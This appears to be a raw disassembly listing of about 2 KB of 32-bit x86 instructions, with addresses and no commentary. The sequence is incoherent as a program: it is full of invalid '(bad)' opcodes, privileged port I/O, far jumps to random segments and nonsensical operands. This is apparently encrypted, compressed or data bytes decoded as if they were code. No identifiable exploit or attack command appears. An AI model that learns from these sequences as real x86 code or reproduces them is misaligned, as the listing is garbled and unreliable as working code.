  41300e:	lea    esp,[ecx+0x17ad2c1c]
  413014:	shl    ecx,cl
  413016:	bound  edx,QWORD PTR [esp+edi*4+0x72830c88]
  41301d:	push   edi
  41301e:	jmp    0x9085:0xec15126c
  413025:	cmc    
  413026:	pop    ss
  413027:	into   
  413028:	out    dx,al
  413029:	sub    eax,0x9cf48688
  41302e:	cmp    ah,BYTE PTR ds:0x1e7e1a5e
  413034:	in     al,0x54
  413036:	xor    edi,edx
  413038:	ror    DWORD PTR [eax-0x282bf0cb],0x17
  41303f:	inc    ecx
  413040:	popf   
  413041:	stos   DWORD PTR es:[edi],eax
  413042:	ret    
  413043:	je     0x412fd9
  413045:	mov    fs,WORD PTR [esi-0x5a]
  413048:	(bad)  
  413049:	and    DWORD PTR [ebp+0x7f],eax
  41304c:	adc    DWORD PTR [edx+0x6f745193],esp
  413052:	shr    DWORD PTR ds:0x21012bca,1
  413058:	or     esi,DWORD PTR [ecx+0x3e8ae22a]
  41305e:	cmp    al,0x89
  413060:	jae    0x41307a
  413062:	push   edx
  413063:	push   ecx
  413064:	loop   0x41306e
  413066:	pop    eax
  413067:	test   DWORD PTR es:0x48b46dba,ebp
  41306e:	inc    ebx
  41306f:	mov    edx,0xee1e063a
  413074:	fs mov dh,0xdc
  413077:	sahf   
  413078:	pusha  
  413079:	stc    
  41307a:	das    
  41307b:	stos   BYTE PTR es:[edi],al
  41307c:	mov    al,ds:0x3b604ae7
  413081:	xchg   esi,eax
  413082:	mov    BYTE PTR [edi],0xb9
  413085:	shr    DWORD PTR [ebp-0x10],1
  413088:	push   0xffffffae
  41308a:	sbb    DWORD PTR [ebp+ebx*4-0x10],ecx
  41308e:	jl     0x4130cf
  413090:	cmp    BYTE PTR [edx+ecx*2],dh
  413093:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413094:	and    BYTE PTR [ebp-0x1e],0xbe
  413098:	lods   al,BYTE PTR ds:[esi]
  413099:	mov    ds:0x54220c28,al
  41309e:	pop    edi
  41309f:	push   cs
  4130a0:	push   ebp
  4130a1:	inc    edx
  4130a2:	push   edx
  4130a3:	daa    
  4130a4:	outs   dx,BYTE PTR ds:[esi]
  4130a5:	clc    
  4130a6:	jnp    0x413073
  4130a8:	das    
  4130a9:	sub    eax,0xea2f0007
  4130ae:	sbb    DWORD PTR [eax+0xc763f0d],ebp
  4130b4:	mov    BYTE PTR [ecx-0x22],dl
  4130b7:	xchg   esi,eax
  4130b8:	jns    0x413108
  4130ba:	xchg   DWORD PTR [ebp-0x72],esi
  4130bd:	inc    eax
  4130be:	hlt    
  4130bf:	into   
  4130c0:	aad    0x5b
  4130c2:	call   0x3f3a9302
  4130c7:	add    DWORD PTR [ecx+0x29684038],ebp
  4130cd:	xor    bl,BYTE PTR [ebx+0x34]
  4130d0:	cmc    
  4130d1:	imul   esp,eax,0xe8c10d22
  4130d7:	fist   WORD PTR [ebp+0x2dc41ac1]
  4130dd:	pop    ebp
  4130de:	add    al,0x3b
  4130e0:	mov    ch,0x20
  4130e2:	push   esi
  4130e3:	pop    ds
  4130e4:	in     eax,0x2a
  4130e6:	pop    ss
  4130e7:	mul    DWORD PTR [edx-0x58]
  4130ea:	lods   al,BYTE PTR ds:[esi]
  4130eb:	(bad)  [ebp-0xfa9ab47]
  4130f1:	outs   dx,BYTE PTR ds:[esi]
  4130f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130f3:	scas   eax,DWORD PTR es:[edi]
  4130f4:	adc    BYTE PTR [ecx-0x30],0x8b
  4130f8:	ss push esi
  4130fa:	dec    ebx
  4130fb:	scas   eax,DWORD PTR es:[edi]
  4130fc:	iret   
  4130fd:	push   esp
  4130fe:	add    BYTE PTR [edi+ebx*2],0x67
  413102:	push   ds
  413103:	push   ss
  413104:	sub    cl,bl
  413106:	js     0x41310c
  413108:	ror    DWORD PTR [ebx+0x517ef816],1
  41310e:	(bad)  
  41310f:	mov    esi,0xa5a0e2cc
  413114:	dec    ebx
  413115:	cmp    DWORD PTR [edi],eax
  413117:	shl    DWORD PTR [esi-0xf17e295],1
  41311d:	or     al,0xfe
  41311f:	ret    0xf1b2
  413122:	xlat   BYTE PTR ds:[ebx]
  413123:	push   ebx
  413124:	inc    ebx
  413125:	nop
  413126:	pop    edx
  413127:	add    bh,BYTE PTR [ecx-0x1e03310b]
  41312d:	fbld   TBYTE PTR [edi-0x51]
  413130:	inc    esi
  413131:	xchg   edx,eax
  413132:	rcl    DWORD PTR [edi],0x92
  413135:	sbb    BYTE PTR [esi-0x53],0x8f
  413139:	ret    0x4962
  41313c:	ror    DWORD PTR [edi-0x1c],1
  41313f:	call   0xcd434ee4
  413144:	outs   dx,BYTE PTR cs:[esi]
  413146:	sahf   
  413147:	loope  0x4131b9
  413149:	xor    ah,cl
  41314b:	or     eax,0x6a246701
  413150:	mov    bl,0xcc
  413152:	js     0x413118
  413154:	pusha  
  413155:	in     al,dx
  413156:	imul   esp,DWORD PTR [eax+0x19],0xfffffff4
  41315a:	je     0x41319f
  41315c:	jo     0x4131d2
  41315e:	adc    ebx,edx
  413160:	mov    al,ds:0xafb81c9f
  413165:	mov    al,ds:0x97f59dab
  41316a:	lock xchg ebp,eax
  41316c:	fild   DWORD PTR [esi+0x75]
  41316f:	ds aaa 
  413171:	push   ss
  413172:	fs mov dh,cl
  413175:	pusha  
  413176:	dec    ecx
  413177:	inc    edx
  413178:	inc    esi
  413179:	pop    ss
  41317a:	(bad)  
  41317b:	push   edx
  41317c:	aaa    
  41317d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41317e:	lock out dx,eax
  413180:	arpl   WORD PTR [edi+0x71],ax
  413183:	pushf  
  413184:	jnp    0x413147
  413186:	rol    DWORD PTR [ecx-0x66adaf69],0x64
  41318d:	scas   al,BYTE PTR es:[edi]
  41318e:	nop
  41318f:	test   eax,0x25ecfe8c
  413194:	inc    esi
  413195:	adc    eax,DWORD PTR [ebx-0x1b24c0e7]
  41319b:	adc    edx,DWORD PTR [edi+0x6a]
  41319e:	jle    0x413130
  4131a0:	retf   0x6368
  4131a3:	jmp    0xb843:0x6ec27181
  4131aa:	xor    edi,DWORD PTR [esi+0x6b]
  4131ad:	shl    DWORD PTR [eax+eiz*8+0x16],1
  4131b1:	fdivr  QWORD PTR [ebx+0x53]
  4131b4:	mov    ds:0x7aad1437,al
  4131b9:	dec    ebp
  4131ba:	fisubr WORD PTR [edx+ecx*4-0x701a638c]
  4131c1:	out    dx,eax
  4131c2:	nop
  4131c3:	inc    edi
  4131c4:	dec    bl
  4131c6:	xor    esi,DWORD PTR [esi-0x751a5247]
  4131cc:	dec    ebx
  4131cd:	test   BYTE PTR [ecx-0x27],bl
  4131d0:	mov    cl,0xc0
  4131d2:	add    dh,al
  4131d4:	inc    edx
  4131d5:	loopne 0x413186
  4131d7:	ins    BYTE PTR es:[edi],dx
  4131d8:	cmp    eax,esp
  4131da:	retf   
  4131db:	repz add eax,0x9248a26d
  4131e1:	pop    ss
  4131e2:	outs   dx,DWORD PTR ds:[esi]
  4131e3:	sbb    eax,DWORD PTR [edi+0x188b30fe]
  4131e9:	pop    ds
  4131ea:	mov    esp,0x35655bc1
  4131ef:	mov    ds,esi
  4131f1:	in     al,dx
  4131f2:	add    BYTE PTR [ecx],0xf2
  4131f5:	icebp  
  4131f6:	pop    edi
  4131f7:	mov    BYTE PTR [ecx+0x7d],ch
  4131fa:	inc    edi
  4131fb:	jnp    0x413221
  4131fd:	mov    cl,0x4b
  4131ff:	dec    ebx
  413200:	outs   dx,BYTE PTR ds:[esi]
  413201:	inc    edi
  413202:	jnp    0x4131aa
  413204:	retf   
  413205:	test   BYTE PTR [edi+0x2a],bh
  413208:	pop    ecx
  413209:	push   ds
  41320a:	push   ecx
  41320b:	and    ah,BYTE PTR [ebp-0x51]
  41320e:	mov    ds,WORD PTR [ecx]
  413210:	jmp    FWORD PTR [ebx]
  413212:	jl     0x41327e
  413214:	mov    WORD PTR [edi],cs
  413216:	xchg   esp,eax
  413217:	js     0x413293
  413219:	ins    BYTE PTR es:[edi],dx
  41321a:	enter  0x3440,0xfb
  41321e:	sub    ebp,0x7000b6b7
  413224:	or     esp,DWORD PTR [ebx]
  413226:	dec    esp
  413227:	mov    ebx,0x906b6f78
  41322c:	mov    esi,0x1bc17e68
  413231:	xor    DWORD PTR [ebx-0x55],edi
  413234:	xchg   esp,eax
  413235:	mov    esi,ss
  413237:	mov    ebp,0x7dea7dba
  41323c:	test   eax,0x716eac7c
  413241:	add    eax,edi
  413243:	adc    bh,bh
  413245:	pop    ds
  413246:	or     DWORD PTR [esi],ecx
  413248:	in     al,dx
  413249:	sahf   
  41324a:	xor    BYTE PTR [ebx-0x7c6b89a2],al
  413250:	dec    esi
  413251:	xchg   ebp,eax
  413252:	(bad)  
  413253:	ficomp DWORD PTR [ebp-0x3a3e7d3e]
  413259:	push   edi
  41325a:	add    al,0xd0
  41325c:	add    BYTE PTR [ebx+0x473ea178],bl
  413262:	dec    edx
  413263:	adc    al,ch
  413265:	adc    al,BYTE PTR [edi-0x65]
  413268:	sub    DWORD PTR [esi-0x421b7b3d],ebp
  41326e:	test   DWORD PTR [edi+0x2b],ebp
  413271:	fistp  WORD PTR ds:0x42b6877e
  413277:	xchg   ebp,eax
  413278:	fxch   st(3)
  41327a:	dec    esp
  41327b:	je     0x4132bd
  41327d:	add    BYTE PTR fs:[esi-0x51320f62],bh
  413284:	xchg   DWORD PTR [edx+0x4b181b38],ebp
  41328a:	xchg   edx,eax
  41328b:	xor    edi,esp
  41328d:	mov    edi,eax
  41328f:	popa   
  413290:	daa    
  413291:	cmp    BYTE PTR [ecx-0x5dc4019f],cl
  413297:	pop    ebp
  413298:	jg     0x4132f7
  41329a:	inc    esp
  41329b:	dec    edi
  41329c:	inc    eax
  41329d:	xchg   ebx,eax
  41329e:	addr16 push ds
  4132a0:	fadd   DWORD PTR [edi+esi*4-0x57]
  4132a4:	aaa    
  4132a5:	lea    ebp,[eax+0x19]
  4132a8:	sub    eax,0xcf3eed51
  4132ad:	mov    ecx,0xedbcb52
  4132b2:	pop    es
  4132b3:	rcr    esp,1
  4132b5:	sbb    al,0xcb
  4132b7:	shl    DWORD PTR [ebp-0x362e20f6],cl
  4132bd:	leave  
  4132be:	and    dl,BYTE PTR [eax-0x78]
  4132c1:	cli    
  4132c2:	sbb    al,0xcc
  4132c4:	gs pop eax
  4132c6:	pop    ds
  4132c7:	loop   0x41329e
  4132c9:	pop    esi
  4132ca:	pop    edi
  4132cb:	popa   
  4132cc:	pop    ebx
  4132cd:	or     eax,0x8235c7f1
  4132d2:	push   cs
  4132d3:	jmp    0x4ef04924
  4132d8:	mov    eax,ds:0xc9ed531f
  4132dd:	in     al,0x12
  4132df:	and    BYTE PTR [eax],dl
  4132e1:	test   BYTE PTR [esi],0xb
  4132e4:	pop    ecx
  4132e5:	xor    DWORD PTR [edi+0x4d557b0a],ebp
  4132eb:	mov    dh,0x67
  4132ed:	push   0xd0e850af
  4132f2:	and    BYTE PTR [esi+0x38],cl
  4132f5:	or     BYTE PTR [ecx+0x5de1257c],dl
  4132fb:	adc    eax,0x5e601717
  413300:	cmc    
  413301:	inc    eax
  413302:	mov    edi,eax
  413304:	in     eax,0xd7
  413306:	ins    BYTE PTR es:[edi],dx
  413307:	aaa    
  413308:	int    0xcf
  41330a:	or     eax,eax
  41330c:	mov    esi,0xbe942232
  413311:	dec    ebx
  413312:	xchg   ecx,eax
  413313:	jo     0x413349
  413315:	js     0x413326
  413317:	inc    eax
  413318:	or     DWORD PTR [ebx-0x4e],eax
  41331b:	jge    0x41331b
  41331d:	add    DWORD PTR [edi+0x636839f1],edi
  413323:	ficomp WORD PTR [edx+0x64]
  413326:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413327:	inc    edx
  413328:	xor    eax,0xfe6f1420
  41332d:	lahf   
  41332e:	pop    ebx
  41332f:	aam    0x48
  413331:	outs   dx,BYTE PTR ds:[esi]
  413332:	mov    dl,0x17
  413334:	imul   ecx,DWORD PTR [ecx],0x5a
  413337:	pxor   mm1,QWORD PTR [eax-0x5]
  41333b:	xor    al,0x4b
  41333d:	xchg   esi,eax
  41333e:	(bad)  
  41333f:	out    0x34,al
  413341:	es cmp ecx,edx
  413344:	mov    bl,0xc2
  413346:	outs   dx,BYTE PTR ds:[esi]
  413347:	popf   
  413348:	mov    eax,ds:0xb1b21b00
  41334d:	sub    al,BYTE PTR [esi+0x21]
  413350:	test   al,0x8f
  413352:	cmp    eax,0xa0ff48cd
  413357:	outs   dx,DWORD PTR ds:[esi]
  413358:	int    0x98
  41335a:	fcomp  QWORD PTR [ecx]
  41335c:	shl    BYTE PTR [edi],cl
  41335e:	shr    dl,0x5b
  413361:	mov    ebp,DWORD PTR [eax+0x19]
  413364:	xor    edi,DWORD PTR [edi+0x13b3392f]
  41336a:	int    0xcf
  41336c:	sbb    al,0x85
  41336e:	pop    esi
  41336f:	pop    esi
  413370:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413371:	sbb    BYTE PTR [edx+0x4a76920f],bl
  413377:	fild   DWORD PTR es:[edx]
  41337a:	call   0x6a1b:0xaa9c2abb
  413381:	(bad)  
  413382:	cmc    
  413383:	aad    0x8c
  413385:	fdiv   st,st(4)
  413387:	mov    cl,0xab
  413389:	in     eax,0x88
  41338b:	or     DWORD PTR es:[edx-0x32],edx
  41338f:	add    eax,DWORD PTR [ebx+0x7c]
  413392:	dec    edi
  413393:	nop
  413394:	aaa    
  413395:	xchg   ebx,eax
  413396:	sub    bl,BYTE PTR [ebx+ecx*4+0x7d]
  41339a:	mov    esi,0xedf80efd
  41339f:	mov    ebp,0xe9a23755
  4133a4:	mov    bl,0x96
  4133a6:	cs stc 
  4133a8:	inc    esp
  4133a9:	ds pop ecx
  4133ab:	mov    edx,0x80db4854
  4133b0:	add    BYTE PTR [edx+0x1d],cl
  4133b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133b4:	ss xchg edi,eax
  4133b6:	push   eax
  4133b7:	xlat   BYTE PTR ds:[ebx]
  4133b8:	(bad)  
  4133b9:	rcr    BYTE PTR [edi],1
  4133bb:	sub    ebx,DWORD PTR [esi-0x1a2d82bf]
  4133c1:	jnp    0x4133cf
  4133c3:	fiadd  WORD PTR [ecx-0x68221e51]
  4133c9:	sbb    dl,BYTE PTR [ebx+0x7d97fd15]
  4133cf:	push   0x9c9f391d
  4133d4:	pusha  
  4133d5:	popf   
  4133d6:	push   0x31
  4133d8:	outs   dx,BYTE PTR ds:[esi]
  4133d9:	xchg   BYTE PTR [ebp+eax*4+0x52],bh
  4133dd:	lahf   
  4133de:	ret    0x500d
  4133e1:	lods   al,BYTE PTR ds:[esi]
  4133e2:	add    edi,DWORD PTR [ecx+ebp*2-0x45]
  4133e6:	sahf   
  4133e7:	mov    dl,0xe8
  4133e9:	jmp    0xc221aa57
  4133ee:	ja     0x41342e
  4133f0:	fdivr  DWORD PTR [edi-0x382dea41]
  4133f6:	inc    ebp
  4133f8:	mov    dh,0xda
  4133fa:	outs   dx,BYTE PTR ds:[esi]
  4133fb:	test   BYTE PTR [edx-0x2b],bl
  4133fe:	lods   eax,DWORD PTR ds:[esi]
  4133ff:	jno    0x4133c6
  413401:	(bad)  
  413402:	out    dx,al
  413403:	loopne 0x4133c1
  413405:	repz push edx
  413407:	inc    ebp
  413408:	jae    0x4133d2
  41340a:	mov    eax,0x664798fe
  41340f:	fstp   DWORD PTR ds:[esi]
  413412:	xor    al,0x4b
  413414:	in     eax,dx
  413415:	pop    esp
  413416:	xchg   esi,eax
  413417:	and    ebx,DWORD PTR [ecx+0x1e5d41db]
  41341d:	add    BYTE PTR [esi+ebp*1],ah
  413420:	pop    edi
  413421:	pop    DWORD PTR [edx+0x4465eecb]
  413427:	or     BYTE PTR [esi-0x2ae299de],cl
  41342d:	mov    edi,0x5a53bf29
  413432:	pop    edx
  413433:	shl    edi,cl
  413435:	sub    BYTE PTR [esi],dh
  413437:	mov    edx,0x3f152c6a
  41343c:	inc    esi
  41343d:	pusha  
  41343e:	xchg   edi,ebp
  413440:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413441:	xchg   DWORD PTR [edi],ecx
  413443:	mov    esp,0x5798046d
  413448:	sub    DWORD PTR [eax+ebp*1],0xddbfc124
  41344f:	loope  0x41349d
  413451:	mov    ebx,0xcbd1a6ae
  413456:	enter  0xb0c6,0x2
  41345a:	lods   al,BYTE PTR ds:[esi]
  41345b:	out    0xd9,al
  41345d:	daa    
  41345e:	or     eax,0x70fd36c3
  413463:	je     0x4133f0
  413465:	pop    ebx
  413466:	ss stos DWORD PTR es:[edi],eax
  413468:	jle    0x4134cf
  41346a:	daa    
  41346b:	dec    eax
  41346c:	dec    edx
  41346d:	mov    ebx,0x21ae2c39
  413472:	pop    ecx
  413473:	repz mov al,ds:0xbae41546
  413479:	ficom  WORD PTR [esi]
  41347b:	sbb    bl,BYTE PTR [edx-0x13]
  41347e:	jmp    0x41345b
  413480:	js     0x4134bc
  413482:	jle    0x4134a8
  413484:	pop    es
  413485:	mov    DWORD PTR [esi],ebx
  413487:	ret    0xcdd5
  41348a:	(bad)  
  41348c:	sub    eax,ecx
  41348e:	push   ebp
  41348f:	pop    edx
  413490:	sar    DWORD PTR ds:0x67f9009,0x4c
  413497:	adc    ah,dh
  413499:	fisub  DWORD PTR [ecx]
  41349b:	mov    al,ds:0x8e71bf3e
  4134a0:	inc    ecx
  4134a1:	adc    al,0xbd
  4134a3:	test   al,0x25
  4134a5:	dec    ecx
  4134a6:	(bad)  
  4134a7:	push   esp
  4134a8:	aaa    
  4134a9:	shr    BYTE PTR [ecx+ebx*4],1
  4134ac:	aam    0x37
  4134ae:	nop
  4134af:	sbb    al,0x81
  4134b1:	inc    ecx
  4134b2:	lds    ebp,FWORD PTR [ecx]
  4134b4:	mov    edi,DWORD PTR [eax]
  4134b6:	out    dx,al
  4134b7:	test   BYTE PTR [ebx],bh
  4134b9:	inc    eax
  4134ba:	pop    esp
  4134bb:	ret    
  4134bc:	xor    ebx,eax
  4134be:	mov    esp,0xdb2c1932
  4134c3:	xchg   esp,eax
  4134c4:	lock mov bl,0xf0
  4134c7:	mov    ?,WORD PTR [ebp-0x70]
  4134ca:	mov    ebp,0x4baec5cc
  4134cf:	es mov dh,0x82
  4134d2:	mov    ?,WORD PTR [edi-0x59]
  4134d5:	push   ebx
  4134d6:	jmp    0x41346d
  4134d8:	in     al,dx
  4134d9:	repnz mov edx,0x69083858
  4134df:	jnp    0x4134e4
  4134e1:	fld    DWORD PTR [eax+eax*1]
  4134e4:	arpl   ax,ax
  4134e6:	mov    DWORD PTR [ebp-0x668871e],ebp
  4134ec:	sahf   
  4134ed:	push   edx
  4134ee:	and    dl,BYTE PTR [edx]
  4134f0:	sahf   
  4134f1:	aaa    
  4134f2:	jg     0x413512
  4134f4:	xor    BYTE PTR [ecx-0x7b],ah
  4134f7:	add    eax,0x9cabc76c
  4134fc:	repnz lea esp,[edi+0x36]
  413500:	inc    esi
  413501:	push   cs
  413502:	loop   0x413567
  413504:	mov    ah,0x8c
  413506:	sbb    DWORD PTR [ebx+0x6a],0x95884d5f
  41350d:	mov    esi,0xa6057a65
  413512:	aas    
  413513:	outs   dx,WORD PTR ds:[esi]
  413515:	adc    al,0xe8
  413517:	sub    al,bh
  413519:	cli    
  41351a:	cmp    DWORD PTR [esi-0x4f],0xa08b1604
  413521:	cmp    bh,ah
  413523:	xor    al,0x55
  413525:	ja     0x41358e
  413527:	arpl   WORD PTR [edi],cx
  413529:	fs mov bh,0x1b
  41352c:	inc    eax
  41352d:	sbb    BYTE PTR fs:[ebx+eax*4],bl
  413531:	dec    edx
  413532:	popf   
  413533:	inc    ebp
  413534:	out    0x44,al
  413536:	inc    esi
  413537:	pop    edx
  413538:	pop    edi
  413539:	mov    al,ds:0x39e8ff1f
  41353e:	mov    bl,0xdd
  413540:	mov    edi,0x68d1b601
  413545:	mov    bh,0xb9
  413547:	and    DWORD PTR [ecx],0x8af6e334
  41354d:	ins    BYTE PTR es:[edi],dx
  41354e:	ds push ecx
  413550:	xchg   edx,eax
  413551:	jbe    0x4135b9
  413553:	pop    ebx
  413554:	iret   
  413555:	outs   dx,DWORD PTR ds:[esi]
  413556:	scas   al,BYTE PTR es:[edi]
  413557:	dec    ebp
  413558:	outs   dx,DWORD PTR ds:[esi]
  413559:	mov    esi,0x372d7cfc
  41355e:	in     eax,dx
  41355f:	or     ecx,esi
  413561:	cwde   
  413562:	(bad)  
  413563:	dec    esp
  413564:	lods   al,BYTE PTR ds:[esi]
  413565:	mov    ebx,0xf941484b
  41356a:	out    0xac,eax
  41356c:	outs   dx,DWORD PTR ds:[esi]
  41356d:	pushf  
  41356e:	or     ebx,DWORD PTR [edx+0x2ec76f5]
  413574:	mov    eax,0x5587900
  413579:	mov    ch,0xf8
  41357b:	sub    al,BYTE PTR [ebp+0x2d9368f3]
  413581:	mov    esi,0x8680932c
  413586:	pop    ebx
  413587:	push   0xcd05d6da
  41358c:	lock mov ds:0xca230293,al
  413592:	adc    dh,al
  413594:	dec    eax
  413595:	(bad)  
  413596:	mov    dl,0xea
  413598:	mov    al,0x5d
  41359a:	retf   0x3c7f
  41359d:	fwait
  41359e:	jle    0x41355a
  4135a0:	add    eax,edx
  4135a2:	add    DWORD PTR [edx-0x60],esp
  4135a5:	call   0x9287:0x9c3cdd97
  4135ac:	add    eax,0xe118a1c5
  4135b1:	push   ds
  4135b2:	mov    ah,0xd0
  4135b4:	mov    esp,0x40719af3
  4135b9:	mov    esi,0x82d5641c
  4135be:	xor    al,0xd1
  4135c0:	xchg   ebx,eax
  4135c1:	xor    eax,0xcf7e4a4d
  4135c6:	stos   BYTE PTR es:[edi],al
  4135c7:	pop    DWORD PTR [esp+eax*2-0x4430bfac]
  4135ce:	mov    bl,0x5b
  4135d0:	aas    
  4135d1:	push   esp
  4135d2:	jnp    0x41360b
  4135d4:	stos   BYTE PTR es:[edi],al
  4135d5:	pop    esi
  4135d6:	or     ch,BYTE PTR [eax+0x790fa2dd]
  4135dc:	xor    eax,0x36c3b27
  4135e1:	push   ds
  4135e2:	jo     0x4135ea
  4135e4:	and    bh,BYTE PTR [edx+0x1b]
  4135e7:	in     al,0x18
  4135e9:	bound  edx,QWORD PTR [edi+ebp*4]
  4135ec:	sbb    edx,DWORD PTR [ebx+0x29df0c59]
  4135f2:	cmp    al,0x35
  4135f4:	xor    al,0x67
  4135f6:	(bad)  
  4135f7:	jnp    0x413668
  4135f9:	sbb    dh,BYTE PTR [ebp+0x7]
  4135fc:	xor    DWORD PTR [ecx+0x8a3d75],edx
  413602:	aam    0x3d
  413604:	cmp    DWORD PTR [ebx-0x7be2a98],ecx
  41360a:	xchg   esp,eax
  41360b:	mov    ds:0x795f05cd,al
  413610:	sti    
  413611:	xor    al,0x60
  413613:	loop   0x41367e
  413615:	cli    
  413616:	mov    dl,0xf2
  413618:	push   cs
  413619:	pop    esi
  41361a:	fstp   DWORD PTR [eax-0x4d7d58b1]
  413620:	jl     0x413621
  413622:	mov    edi,0x96f67cab
  413627:	loopne 0x4135d8
  413629:	xchg   esp,eax
  41362a:	out    0xe0,al
  41362c:	push   cs
  41362d:	aad    0xdf
  41362f:	imul   edx,DWORD PTR [ebx],0xffffffa9
  413632:	xchg   esp,eax
  413633:	or     cl,BYTE PTR [edi+0x31]
  413636:	mov    eax,0x2a5be527
  41363b:	and    esi,DWORD PTR [edx]
  41363d:	mov    esi,0xc833798c
  413642:	or     DWORD PTR [ebx-0x78],esi
  413645:	inc    esi
  413646:	jbe    0x413669
  413648:	out    0xe4,al
  41364a:	cdq    
  41364b:	(bad)  
  41364c:	xchg   ecx,eax
  41364d:	inc    esi
  41364e:	xlat   BYTE PTR ds:[ebx]
  41364f:	or     esp,esp
  413651:	or     al,0x3a
  413653:	xchg   esp,eax
  413654:	push   cs
  413655:	cs mov ch,0xf9
  413658:	jecxz  0x4135e5
  41365a:	xchg   esp,eax
  41365b:	adc    dl,BYTE PTR [edx+esi*1]
  41365e:	mov    edi,0xbaf7a8be
  413663:	adc    al,0xb9
  413665:	jb     0x413613
  413667:	xchg   esi,eax
  413668:	xchg   esi,eax
  413669:	push   esi
  41366a:	retf   0x77a4
  41366d:	rcl    DWORD PTR [eax],1
  41366f:	inc    esp
  413670:	leave  
  413671:	addr16 lock add al,0x1b
  413675:	lock adc eax,0xb5d162bd
  41367b:	or     al,0x39
  41367d:	add    esi,esi
  41367f:	jbe    0x4136ed
  413681:	inc    esp
  413682:	jg     0x41369f
  413684:	outs   dx,BYTE PTR ds:[esi]
  413685:	stc    
  413686:	aad    0x7c
  413688:	icebp  
  413689:	retf   0xf6cf
  41368c:	scas   eax,DWORD PTR es:[edi]
  41368d:	das    
  41368e:	xor    DWORD PTR [esi-0x1f1a3a82],ebx
  413694:	xchg   edx,eax
  413695:	jmp    0xd5e8:0xe985a16d
  41369c:	push   esp
  41369d:	ret    
  41369e:	and    al,BYTE PTR [ebp-0x3e]
  4136a1:	aam    0x5f
  4136a3:	call   0xec3:0x4b6b476b
  4136aa:	cmp    ch,al
  4136ac:	gs xchg edx,eax
  4136ae:	sbb    eax,0x963c6758
  4136b3:	enter  0x1c6f,0xc
  4136b7:	jg     0x413685
  4136b9:	adc    al,0x7f
  4136bb:	and    ebx,eax
  4136bd:	and    esi,ebx
  4136bf:	jbe    0x4136bd
  4136c1:	jecxz  0x41367f
  4136c3:	(bad)  
  4136c4:	push   edi
  4136c5:	test   DWORD PTR [ecx],ebp
  4136c7:	mov    bh,0xd3
  4136c9:	idiv   BYTE PTR [edx+0x7b]
  4136cc:	scas   eax,DWORD PTR es:[edi]
  4136cd:	shl    DWORD PTR [eax-0x12],1
  4136d0:	leave  
  4136d1:	add    esp,0xbf489d62
  4136d7:	sar    DWORD PTR [edx+0x44],1
  4136da:	outs   dx,DWORD PTR ds:[esi]
  4136db:	sbb    ch,bh
  4136dd:	je     0x4136f0
  4136df:	fbstp  TBYTE PTR [edx+ebp*4+0x50344e63]
  4136e6:	in     eax,0xed
  4136e8:	add    DWORD PTR [esi+edx*4+0x6],ebx
  4136ec:	push   ecx
  4136ed:	int3   
  4136ee:	sar    DWORD PTR [esi],0xac
  4136f1:	out    dx,eax
  4136f2:	push   ss
  4136f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136f4:	adc    al,0x51
  4136f6:	imul   esi,DWORD PTR [ebx],0x43
  4136f9:	jp     0x4136bf
  4136fb:	sub    esi,edx
  4136fd:	cld    
  4136fe:	sub    edi,0x7cebcaa2
  413704:	test   DWORD PTR [ebx],ebx
  413706:	sub    DWORD PTR [ebx+0x14],ebx
  413709:	data16 or cl,bh
  41370c:	dec    ebp
  41370d:	jle    0x4136b7
  41370f:	cli    
  413710:	repnz aam 0xd5
  413713:	out    dx,al
  413714:	icebp  
  413715:	arpl   WORD PTR [esi+0x1d],di
  413718:	imul   edi,DWORD PTR [edi-0x47],0x1eb0ee44
  41371f:	lods   eax,DWORD PTR ds:[esi]
  413720:	movhps xmm3,QWORD PTR [edx+0x21]
  413724:	call   0xefbaacf6
  413729:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41372a:	sbb    al,0xbb
  41372c:	inc    esp
  41372d:	pop    ebp
  41372e:	je     0x4137a3
  413730:	popf   
  413731:	or     DWORD PTR [ebx-0x1b],esp
  413734:	ja     0x4137af
  413736:	jbe    0x41371c
  413738:	dec    eax
  413739:	fdivr  DWORD PTR [eax+0x4d]
  41373c:	and    esp,DWORD PTR [esi]
  41373e:	add    eax,0x5a73c726
  413743:	ror    DWORD PTR [edi-0x7fd4668e],0x81
  41374a:	and    al,0xfa
  41374c:	enter  0xa792,0xd8
  413750:	leave  
  413751:	adc    esi,DWORD PTR [edx]
  413753:	mov    BYTE PTR [eax],al
  413755:	inc    edi
  413756:	pop    ds
  413757:	dec    eax
  413758:	add    edi,ecx
  41375a:	ror    BYTE PTR [eax-0x1cec15b5],cl
  413760:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413761:	jnp    0x413750
  413763:	je     0x413754
  413765:	mov    eax,0x6eded9b
  41376a:	outs   dx,DWORD PTR ds:[esi]
  41376b:	cdq    
  41376c:	enter  0xa838,0xc2
  413770:	xchg   DWORD PTR [edx+0x16],edi
  413773:	push   ebx
  413774:	push   ss
  413775:	dec    esi
  413776:	rol    BYTE PTR [ebp-0x58bfd57f],cl
  41377c:	inc    edx
  41377d:	dec    esi
  41377e:	hlt    
  41377f:	push   ebp
  413780:	arpl   WORD PTR [esp+edx*2],ax
  413783:	rcl    DWORD PTR [ebx],cl
  413785:	ret    0x3ae
  413788:	mov    al,ds:0x1dba05c
  41378d:	imul   edx,DWORD PTR ds:0xd2faa02d,0x9dc60144
  413797:	pop    esi
  413798:	fadd   st(0),st
  41379a:	int3   
  41379b:	mov    esi,0x28a943ac
  4137a0:	loop   0x4137e2
  4137a2:	aam    0xee
  4137a4:	cdq    
  4137a5:	test   BYTE PTR [esi+0x47],bh
  4137a8:	jae    0x4137e2
  4137aa:	inc    esi
  4137ab:	jno    0x413806
  4137ad:	adc    DWORD PTR [edx+ebp*2-0x284e6857],0xfa75698f
  4137b8:	jns    0x413784
  4137ba:	fs in  eax,0x95
  4137bd:	and    eax,0x34289cf4
  4137c2:	loop   0x41380e
  4137c4:	in     al,0xbc
  4137c6:	pop    edx
  4137c7:	(bad)  
  4137c8:	addr16 pusha 
  4137ca:	xchg   edi,eax
  4137cb:	add    eax,0xc7a0c2d5
  4137d0:	jo     0x413837
  4137d2:	leave  
  4137d3:	dec    ebx
